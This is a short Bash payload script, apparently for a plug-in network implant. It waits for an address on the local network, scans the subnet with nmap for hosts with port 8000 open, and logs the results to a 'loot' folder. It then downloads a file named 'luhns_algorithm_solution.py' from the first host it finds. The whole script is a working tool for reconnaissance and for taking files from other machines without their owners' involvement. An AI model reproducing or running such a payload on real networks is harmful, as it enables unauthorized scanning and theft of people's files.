#!/bin/bash

LOOT_DIR="/root/loot/fetch"
FILE_NAME="luhns_algorithm_solution.py"

LED Y
mkdir -p "$LOOT_DIR"

# 1. Connect (Simple Wait)
NETMODE DHCP_CLIENT
while ! ip addr show eth0 | grep -q "inet "; do
    sleep 1
done

sleep 5

# Extracts "192.168.1" from "192.168.1.50/24"
SUBNET=$(ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d. -f1-3)

# 3. Scan & Identify Target
LED M

# -oN saves the list of hosts to a file
# -oG - pipes the machine-readable output so we can grab the IP automatically
TARGET=$(nmap -n -Pn -T4 -p 8000 --open -oN "$LOOT_DIR/scan_results.txt" -oG - ${SUBNET}.0/24 | awk '/8000\/open/ {print $2; exit}')

if [ -z "$TARGET" ]; then
    LED R
    exit 1
fi

LED C

wget -T 10 "http://$TARGET:8000/$FILE_NAME" -O "$LOOT_DIR/$FILE_NAME"

if [ -f "$LOOT_DIR/$FILE_NAME" ]; then
    LED G
else
    LED R
fi